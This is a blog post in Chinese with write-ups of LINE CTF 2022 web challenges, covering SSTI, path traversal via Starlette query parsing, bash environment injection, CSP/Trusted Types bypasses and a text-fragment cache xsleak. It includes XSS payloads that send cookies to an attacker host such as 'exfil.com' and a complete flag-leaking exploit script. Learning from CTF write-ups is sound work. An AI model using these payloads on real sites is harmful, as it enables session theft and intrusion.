---
title: LINE CTF 2022 筆記
date: 2022-03-27 15:15:47
tags: [Security]
categories: [Security]
---

跟著隊伍 [Water Paddler](https://twitter.com/Water_Paddler) 一起參加了 LINE CTF 2022，在隊友的 carry 之下拿了第七名，這次只有一題有幫上一點忙，其他都被隊友解掉或是卡死。這篇簡單記一下每一題的解法，大部分都參考自 [LINE CTF 2022 Writeups by maple3142](https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups)。

<!-- more -->

## gotm(96 solves)

這題被隊友解掉所以沒仔細看，不過賽後看其他 writeup 是 go 的 SSTI，出現在這裡：

``` go
acc := get_account(id)
tpl, err := template.New("").Parse("Logged in as " + acc.id)
if err != nil {
}
tpl.Execute(w, &acc)
```

之前沒碰過 go 的 SSTI，稍微筆記一下，可以用 {`{.}}` 把傳入的物件整個 dump 出來，順便附幾個參考連結：

1. [GO中SSTI研究](https://forum.butian.net/share/1286)
2. [Go SSTI初探](https://tyskill.github.io/posts/gossti/)

## Memo Drive(42 solves)

先附上關鍵程式碼：

``` py
def view(request):
    context = {}

    try:
        context['request'] = request
        clientId = getClientID(request.client.host)

        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise
        
        filename = request.query_params[clientId]
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        
        f = open(path, 'r')
        contents = f.readlines()
        f.close()
        
        context['filename'] = filename
        context['contents'] = contents
```

這題的 flag 在 `./memo/flag` 底下，所以只要想辦法讓上面那一段的 path 可以讀到 flag 就勝利了。

隊友最後用這個 payload：`/view?id=flag;%2f%2e%2e/;`，因為對 python 太不熟，所以起個簡單的 server 來觀察一下：

``` python
from urllib.parse import unquote
import uvicorn
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import JSONResponse

def view(request):

    try:
        clientId = "id"
        print("request.url:", request.url)
        print("request.url.query", request.url.query)
        print("params:", request.query_params)
        print("unquote params:", unquote(request.query_params[clientId]))
        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise
        
        filename = request.query_params[clientId]
        print("filename:", filename)
        print("keys:", request.query_params.keys())
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        print("path:", path)
    
    except:
        pass
    
    return JSONResponse({"a":1})

routes = [
    Route('/view', endpoint=view)
]

app = Starlette(debug=True, routes=routes)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=11000)
```

先來看一下隊友的 payload 會怎樣：`/view?id=flag;%2f%2e%2e/;`

```
request.url: http://0.0.0.0:11000/view?id=flag;%2f%2e%2e/;
request.url.query id=flag;%2f%2e%2e/;
params: id=flag&%2F..%2F=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/../'])
path: ./memo/id/..//flag
```

`request.url` 會直接是 raw URL，沒有 decode 過，然後 `request.url.query` 也是沒 decode 過的版本，到了 `request.query_params` 的時候則是被解析成了兩個 params:

1. id=flag
2. %2F..%2f=

看起來是因為分號 `;` 的關係，所以就算不用 `&` 也可以創造出兩個 params。

而最後在 `request.query_params.keys()` 的時候被 decode，所以最後合起來就會是 `./memo/id..//flag`。

不過在 Discord 上看到其實這樣就好了：`id=flag;/%2e%2e`，結果會是：

``` py
request.url: http://0.0.0.0:11000/view?id=flag;/%2e%2e
request.url.query id=flag;/%2e%2e
params: id=flag&%2F..=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/..'])
path: ./memo/id/../flag
```

接著也在 Discord 看到另一個不同的解法（來自 bbangjo#3967），是利用 Host header：

```
GET http://0.0.0.0:11000/view?id=flag&/..
Host: 0.0.0.0#
```

就會產生神奇的結果：

```
request.url: http://0.0.0.0#/view?id=flag&/..
request.url.query
params: id=flag&%2F..=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/..'])
path: ./memo/id/../flag
```

雖然 `request.url.query` 整個變不見了，但是 `request.query_params` 卻還是有東西，因此就繞過了針對 `request.url.query` 的檢查。

根據他的說法，因為 `request.url` 是從 Host header 構造而來的，我們可以翻一下程式碼來驗證，如果沒找錯的話應該是在這：[starlette/datastructures.py#L38](https://github.com/encode/starlette/blob/b1ae0c3621034f1531b9983389ce90be8d140bc6/starlette/datastructures.py#L38)：

``` py
if host_header is not None:
  url = f"{scheme}://{host_header}{path}"
```

因為 Host 被加了個 `#`，所以後面的 query string 就被當成 fragment 來解析了，而不是 query string，所以 `request.url.query` 就會是空的。

那為什麼 `request.query_params` 有東西呢？因為它是直接拿最原始的 query string，而不是 `request.url.query`，在這邊：[starlette/requests.py#L116](https://github.com/encode/starlette/blob/6182d0a0bc7e5817197d2919b18d67f70e3a71d1/starlette/requests.py#L116)

``` py
@property
def query_params(self) -> QueryParams:
    if not hasattr(self, "_query_params"):
        self._query_params = QueryParams(self.scope["query_string"])
    return self._query_params
```

這真的是要看 source code 才會發現這種差異。

## bb(27 solves)

程式碼很短：

``` php
<?php
    error_reporting(0);

    function bye($s, $ptn){
        if(preg_match($ptn, $s)){
            return false;
        }
        return true;
    }

    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i") && bye($v, "/[a-zA-Z]/i")) {
            putenv("{$k}={$v}");
        }
    }
    system("bash -c 'imdude'");
    
    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i")) {
            putenv("{$k}");
        }
    }
    highlight_file(__FILE__);
?>
```

基本上就是要做到控制環境變數之後 RCE，這讓人自然而然會想到前陣子 P 牛發表的這篇：[我是如何利用环境变量注入执行任意命令](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)，裡面提到可以藉由控制 `BASH_ENV ` 來執行命令。

不過比較麻煩的地方是 a-zA-Z 都不能用，所以要在不能用英文字母的狀況下寫出指令來讀 flag 並回傳到自己 server。

聊天室有人給了一個類似題目的連結可以參考：[34C3 CTF / Tasks / minbashmaxfun / Writeup](https://ctftime.org/writeup/8468)，看了開頭給的 writeup 也才發現原來可以這樣用：

```
# 等同於 $'id'
$'\151\144'
```

靠這樣就可以繞開限制，不用到字母，bash 真是博大精深。

## online library(19 solves)

這是個可以讀取特定檔案範圍的網頁，重點在這一段：

``` js
app.get("/:t/:s/:e", (req: Express.Request, res: Express.Response): void => {
    const s: number = Number(req.params.s)
    const e: number = Number(req.params.e)
    const t: string = req.params.t

    if ((/[\x00-\x1f]|\x7f|\<|\>/).test(t)) {
        res.end("Invalid character in book title.")
    } else  {
        Fs.stat(`public/${t}`, (err: NodeJS.ErrnoException, stats: Fs.Stats): void => {
            if (err) {
                res.end("No such a book in bookself.")
            } else {
                if (s !== NaN && e !== NaN && s < e) {
                    if ((e - s) > (1024 * 256)) {
                        res.end("Too large to read.")
                    } else {
                        Fs.open(`public/${t}`, "r", (err: NodeJS.ErrnoException, fd: any): void => {
                            if (err || typeof fd !== "number") {
                                res.end("Invalid argument.")
                            } else {
                                let buf: Buffer = Buffer.alloc(e - s);
                                Fs.read(fd, buf, 0, (e - s), s, (err: NodeJS.ErrnoException, bytesRead: number, buf: Buffer): void => {
                                    res.end(`<h1>${t}</h1><hr/>` + buf.toString("utf-8"))
                                })
                            }
                        })
                    }
                } else {
                    res.end("There isn't size of book.")
                }
            }
        })
    }
});
```

第 path 的地方放上 `/%2e%2e%2f/0/12345` 就可以 path traversal 然後任意讀檔一下，但問題是要讀哪裡。

在隊友的幫忙下讀了 `/proc/self/mem`，就是現在 node process 的記憶體，至於讀哪段要從 `/proc/self/maps` 去找，怎麼找我就不知道了。

然後因為有個 endpoint 會把參數放到 memory 中，所以可以先用那個 endpoint 去放你的 payload，接著因為這題讀檔有給 offset 的關係，找到記憶體中的 payload 把 offset 設定好，丟給 bot 以後就 XSS 了。

不過根據賽後討論，似乎是因為 flag 在 cookie 中，而 bot 送 request 到 server 時會帶 flag，所以這段 flag 也會出現在記憶體中，因此直接讀記憶體也可以找到 flag，不用 XSS。

## Haribote Secure Note(7 solves)

這題卡了一整天，到最後依舊沒解開，so sad QQ

這題可以設定一個暱稱，最多 16 個字，然後可以新增 note，有 title 跟 content，顯示筆記的頁面關鍵程式碼在這裡：

``` html
<script nonce="{{ csp_nonce }}">
    const printInfo = () => {
        const sharedUserId = "{{ shared_user_id }}";
        const sharedUserName = "{{ shared_user_name }}";
        // 省略
    }

    const printInfoBtn = document.getElementById('printInfoBtn');
    printInfoBtn.addEventListener('click', printInfo);
</script>
```

還有接近結尾的這段：

``` html
<script nonce="{{ csp_nonce }}">
    const render = notes => {
        // 省略
    };
    render({{ notes }})
</script>
```

前面那邊給了我們 16 個字的 JS injection，最後面 notes 那裡則是可以用 `</script>` 來跳離標籤，是 HTML injection，而這題的難點在於 CSP 很嚴：

``` html
<meta content="default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-{{ csp_nonce }}'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
          http-equiv="Content-Security-Policy">
```

因為有 nonce，所以 `unsafe-inline` 沒作用，而 `unsafe-eval` 沒開所以也沒辦法動態去執行程式碼。

當初卡很久之後我有一個想法是我們可以用 HTML injection 插入一個表單 `<form id="f">`，然後就可以對 admin CSRF，目的是去改 admin 的暱稱，因為在另一個頁面 profile 是沒有 CSP 的，而且同樣可以注入：

``` html
<input name="display_name" type="text" class="form-control form-control-sm"
 id="inputUserDisplayName"
 value="{{ current_user.display_name }}">
```

nickname 的部分可以設定成：`";f.submit();"` 之類的，就可以送出表單。改完之後再去造訪 profile 頁面，在那個頁面執行 XSS。

但最大的問題是 `"onfocus=eval(name) ` 有 20 個字元，超過了界線所以無法成功（而且還要想一下 name 要怎麼設定）。

賽後看了其他人的解答，主要有三種。

第一種來自 [Super HexaGoN](https://gist.github.com/mdsnins/d8028c47212342ecadd9af5ec10f53f9)，是利用一個神奇的 [script data double escaped state](https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state)，把兩個注入點中間的東西都註解掉，就可以在有 nonce 的 script 裡面執行程式碼。之前從沒看過這個，以後再來研究一下。

```
display name: <!--<script>"}/*
title: --> /*
content: */ location.href='(attacker)/c='+document.cookie
```





第二種是利用 [import 不會被 Trusted Types 檔的特性](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import)，底下 payload 來自 [maple3142](https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#haribote-secure-note)：

``` js
display name:
"+import(y)+"

title:
</script><a id=x href="//SERVER"></a>

content:
<a id=y href="data:text/javascript,open(x+`?`+document.cookie);alert()"></a>
```

第三種則是利用 iframe，在其他頁面執行程式碼（來自 eskildsen#8025）：

```
name:
";f.eval(p+"");"

title:
</script><iframe src="/p" name=f></iframe> 

content:
<a href="javascript:window.top.location='http://exfil.com/'+btoa(this.parent.document.cookie)" id=p name=p>payload</a> 
```

第三種是我唯一覺得自己有可能想到的，因為其他兩個我都不知道。

話說 `";f.eval(p+"");"` 跟 `<!--<script>"}/*` 恰巧都是 16 個字，我猜其中一個應該是非預期解，這就是 CTF 好玩的地方XD

然後這題真的很有趣而且很值得學習，三種解法都是完全不同的思路。

喔對了，然後 maple3142 的 writeup 解決了我一個疑惑，那就是為什麼這一題的 template 都不會 escape，原來是因為 flask 預設只會 escape HTML/XML/XHTML，難怪我沒看到什麼設定。

## title todo(6 solves)

這題基本上就是個上傳圖片的網站，上傳完會拿到一個 url，接著可以給 title 跟 image url 新建一個 post。

flag 則是用 admin 身份造訪時會放在網頁的最 footer，而且有著奇怪的格式：`LINECTF{([0-9a-f]/){10}}`

然後在顯示圖片的網頁有個地方沒有用雙引號包住：

``` html
<img src={{ image.url }} class="mb-3">
```

雖然看起來是很小的一點，但其實整題的解法都是從這邊延伸出去的。從這邊不難看出我們可以控制 img 的任何屬性，不過我在這邊卡了頗久，想說可以控制又怎樣，沒辦法跳離 img 就不能 XSS。

然後經過隊友提醒才想到 [STTF](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/) 的 xsleak，透過 img 的 lazy loading 來偵測是否有 scroll 的行為，所以只要 title 用很長，把 img 推下去，再加上 `loading=lazy` 的屬性，就可以搭配 STTF 來 leak 一個 byte。

不過這題還有一點要注意，就是 CSP：

```
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' blob:
```

CSP 繞不開，所以就算 `src` 可控，也沒辦法設置外面的圖片。因此這題加上了另一個機制：cache，可以根據 response header 來決定一個圖片的 cache 是 miss 還是 hit，所以我們只要上傳一張新的圖片丟給 bot，過幾秒再去看他的 response header，如果是 hit 就代表 bot 有訪問圖片，代表 SSTF 有成功。

照著這個概念寫一個 exploit 就好：

``` py
import requests
import json
import time
from time import sleep

base_url = 'http://35.187.204.223'
cookie = "session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"

def upload_image():
  files = {'img_file': open('a.png','rb')}

  resp = requests.post(base_url + '/image/upload', files=files, headers={
    "Cookie": cookie
  })
  return json.loads(resp.text)

def create_post(url):
  resp = requests.post(base_url + '/image', data={
    "title": str(time.time()) + "w"*5000,
    "img_url": f"/static/image/111 srcset={url} loading=lazy "
  }, headers={
    "Cookie": cookie
  }, allow_redirects=False)
  return resp.headers["X-ImageId"]

def share(url, keyword):
  resp = requests.post(base_url + '/share', json={
    "path": "image/" + url + "#:~:text=" + keyword,
  }, headers={
    "Cookie": cookie
  })
  return resp.text

def check_cached(img_url):
  resp = requests.get(base_url + img_url, headers={
    "Cookie": cookie
  }, allow_redirects=False)
  return resp.headers["X-Cache-Status"]

def run():
  known = "LINECTF{"
  while True:
    for char in "0123456789abcdef":
      print("trying:" + known+char)

      resp = upload_image()
      img_url = resp["img_url"]
      print("img url:" + img_url)

      img_id = create_post(img_url)
      print("img id:" + img_id)

      share_res = share(img_id, known + char)
      print("resp:" + share_res)

      sleep(3)
      cache_resp = check_cached(img_url)
      print("cached:" + cache_resp)
      if cache_resp == "HIT":
        known += char + "/"
        print(known)
        break


run()
```

另外，maple3142 的 writeup 又解決了我一個疑惑，那就是為什麼 flag 要有那些 `/`？原來是因為 Chromium 為了避免這種 xsleak，所以在判斷 SSTF 的時候一定要匹配到整個單字才會 scroll。

舉例來說，如果頁面上有這串字：`Hello world`，你 text fragment 指定 `He`，是不會理你的，要 `Hello` 才會，這也是為什麼這題要用 `/` 來分割，因為沒分割的話就沒辦法一個字一個字來 leak。

## me7-ball(2 solves)

這題看起來好像跟 crypto 比較有關就沒仔細看了，直接貼 Super HexaGoN 的 writeup：https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682

